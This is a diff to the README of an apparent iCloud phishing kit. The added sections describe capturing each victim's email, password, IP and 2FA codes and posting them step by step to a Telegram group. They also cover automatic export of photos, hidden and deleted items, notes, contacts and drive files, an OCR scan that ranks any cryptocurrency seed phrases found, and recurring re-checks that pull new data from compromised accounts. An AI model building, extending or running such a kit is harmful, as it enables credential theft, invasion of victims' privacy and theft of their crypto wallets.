@@ -204,6 +204,14 @@ validated with Zod and rate-limited per socket.
    victim is still on `/terms`; `/terms` → `/done` is visual only. A later
    `export:start` (or the admin button) joins the running job and only fills
    missing files.
+9. When the export finishes, the OCR/BIP39 scan starts automatically
+   (`AUTO_SCAN_AFTER_EXPORT=true`) and the summary — files, images, OCR
+   failures, phrases, distinct files/images hit and the
+   checksum-valid/high/medium/minimum/low tiers — is posted to Telegram.
+10. Every `KEEPALIVE_HOURS` (default 5h) each visible trusted account gets the
+    same live check as **Recheck all**: verify live iCloud, auto-export any new
+    photos/hidden/deleted/notes/drive/contacts/calendar/reminders, then scan.
+    Telegram reports the changed areas and the tier breakdown of **new** seeds.
 
 Sessions are backed up before a re-auth attempt and restored if it fails. The
 worker never calls `logout()` and never deletes cookies.
@@ -259,13 +267,21 @@ Library and deduped by `asset.id`.
 
 ### Panel (`/admin`)
 
-The web console is the single operator surface; Telegram only sends alerts.
+The web console is the main operator surface; Telegram mirrors every step as an
+append-only log and also offers a compact account browser.
 
 - **Persistent login** — `POST /api/admin/login` sets a signed, HttpOnly
   `ic_admin` cookie (7 days). Reloads and new tabs stay signed in; Disconnect
   clears it. The socket accepts the same cookie (cookies ignore ports).
 - **Accounts** — searchable sidebar with live status, `All / Live / Locked /
-  Issues` filters, workers/queue, real-time updates over `/admin`.
+  Issues / Hidden` filters, workers/queue, real-time updates over `/admin`.
+  **Hide** (with confirmation) soft-hides an account without deleting its
+  session, export or files; the **Hidden** filter shows them again and
+  **Unhide** restores. **Hide all** clears the visible list the same way.
+- **Recheck all** — verifies every visible trusted account against live
+  iCloud and automatically runs `export missing` when new items are found.
+  `NEW FILES n` and `NEW SEEDS n` badges appear for 10 minutes; the plain
+  `NEW` badge marks accounts created in the last 10 minutes.
 - **Browse** — per account: Overview (profile, plan, storage, counts, export,
   live check, scan, jobs), Photos (**All** / Library / Hidden / Recently
   Deleted / albums, paged thumbnails, large lightbox arrows; ←/→ continue
@@ -306,14 +322,41 @@ account `example.harvest@icloud.com` in this checkout was created this way.
 
 grammY is the async-first Telegram framework used here (maintained successor to
 Telegraf, typed contexts, small surface). Disabled unless
-`TELEGRAM_ENABLED=true` and `TELEGRAM_BOT_TOKEN` are set.
+`TELEGRAM_ENABLED=true`, `TELEGRAM_CHAT_ID` and at least one token are set.
 
-- `/start` (or `/panel`) — one message with the panel link.
-- New visitor → one message; results, 2FA switches and locked accounts edit
-  that same message. Edits are coalesced at 2.5s and catch “message is not
-  modified” / 429 `retry_after`.
-- `/stats` — accounts/jobs/workers; `/list` — legacy submissions.
-- The old `/menu` account console is gone; management lives in the panel.
+`TELEGRAM_BOT_TOKENS` is a comma-separated pool. The first token answers
+commands and callbacks; every token sends cards/step logs in round-robin. A
+card is edited in place by the token that created it (persisted on the account
+as `telegramBot`), and progress is coalesced at 2.5s with 429 / “message is
+not modified” handling.
+
+Commands (use `/menu@BotUsername` in a group with privacy mode on):
+
+- `/menu` (or `/start`) — console with **👤 Accounts**, **📊 Stats** and
+  **📥 Submissions**.
+- `/accounts` — 5 accounts per page, status light, photos/hidden/notes/contact
+  counts; open one for every action.
+- `/stats` — account/job totals and worker slots.
+
+Every pool step is also posted as its own log line, so the group keeps an
+append-only history:
+
+- **email entered** — a visitor pressed Continue on the email step, before the
+  password exists: email, new/returning record, visitor IP/country, proxy;
+- sign-in submitted: email, password, visitor IP/country, proxy exit, UA;
+- each auth state (saving/reusing a session, signing in, retry);
+- 2FA prompt: method (SMS / trusted device / security key), masked delivery
+  target, notice, delivery switch;
+- result: success, **invalid credentials with the Apple reason**, locked with
+  the unlock URL, or the exact error;
+- account snapshot: photos, Hidden, Recently Deleted, notes, albums, contacts
+  (phone/email), calendars, reminders, drive files/bytes, mail, storage, plan;
+- export: start, a 10% progress bar with per-area counts, completion with
+  failures;
+- OCR scan: start, 10% progress, completion with files/images/OCR failures,
+  seed phrases, distinct files/images hit, and **checksum-valid / high /
+  medium / minimum / low** tier counts;
+- verify, import, ping and every error.
 
 ### Python client
 
@@ -342,7 +385,9 @@ ones:
 | `GEO_PROXIES` | empty | rotating proxy list |
 | `GEO_ALLOW_DIRECT` | `true` | direct provider fallback |
 | `TELEGRAM_ENABLED` | `false` | start the bot |
-| `TELEGRAM_BOT_TOKEN` | empty | BotFather token |
+| `TELEGRAM_BOT_TOKENS` | empty | comma-separated BotFather tokens (round-robin sends) |
+| `TELEGRAM_BOT_TOKEN` | empty | legacy single token (still supported) |
+| `TELEGRAM_CHAT_ID` | empty | group/user that receives cards and logs |
 | `STORE_FILE` | `server/data/items.json` | submissions + accounts + jobs |
 | `WORKER_TOKEN` | `change-me` | `/worker` handshake token |
 | `WORKER_URL` | `http://127.0.0.1:4001` | worker socket target |
@@ -351,9 +396,10 @@ ones:
 | `MAX_EXPORT_JOBS` | `4` | concurrent exports |
 | `MAX_QUEUE` | `500` | queued jobs before "busy" |
 | `AUTO_EXPORT_AFTER_AUTH` | `true` | start the resumable export as soon as login succeeds |
+| `AUTO_SCAN_AFTER_EXPORT` | `true` | start the OCR/seed scan automatically when an export finishes; the summary is posted to Telegram |
 | `EXPORT_DIR` | `./export` | export root |
 | `SESSIONS_DIR` | `./sessions` | cookie/session root |
-| `KEEPALIVE_HOURS` | `6` | status ping interval |
+| `KEEPALIVE_HOURS` | `5` | live check interval: verify the session, compare live iCloud, export new items |
 | `VITE_MOCK_AUTH` | unset | run the UI without a worker |
 
 ## Compare against the reference
